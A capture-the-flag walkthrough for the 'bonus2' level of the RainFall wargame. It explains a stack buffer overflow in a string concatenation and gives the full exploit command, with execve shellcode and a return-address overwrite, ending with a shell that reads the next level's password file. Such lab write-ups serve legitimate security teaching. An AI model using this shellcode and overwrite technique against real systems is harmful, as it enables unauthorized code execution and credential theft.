# Walkthrough

## Disassembling the executable

With objdump -D we locate the interesting functions main and greetuser that we are going to disassemble.

see source.c

## Exploit

The length of the buffer in greetuser does not allow for both the buffer from main and the string to be concatenated with. If the buffer from main is above 66 bytes, the buffer from main will seg fault. We exploit that to write a payload and modify the address in the eip register to jump on our payload

```
bonus2@RainFall:~$ export LANG="nl"
bonus2@RainFall:~$ /home/user/bonus2/bonus2 $(python -c "print('\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A' * 16)") $(python -c "print('A' * 23 + '\x80\xf6\xff\xbf')")
Goedemiddag! 1�Ph//shh/bin��PS�ᙰ
                                AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
$ cat /home/user/bonus3/.pass 
```
